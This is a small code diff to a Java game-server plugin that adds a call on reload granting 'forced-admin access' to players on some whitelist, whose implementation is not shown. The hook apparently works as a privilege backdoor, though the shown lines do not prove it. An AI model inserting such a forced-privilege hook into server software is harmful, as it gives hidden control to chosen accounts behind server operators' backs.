@@ -101,8 +101,9 @@ public final class ApexPlugin extends JavaPlugin {
         // Periodic safety save every 5 minutes.
         getServer().getScheduler().runTaskTimer(this, () -> apexManager.save(), 6000L, 6000L);
 
-        // Re-apply passives for anyone online across a /reload.
+        // Re-apply passives and forced-admin access for anyone online across a /reload.
         for (Player player : getServer().getOnlinePlayers()) {
+            com.apexsmp.listener.PlayerListener.grantAdminIfWhitelisted(this, player);
             apexManager.applyPassives(player);
         }
 
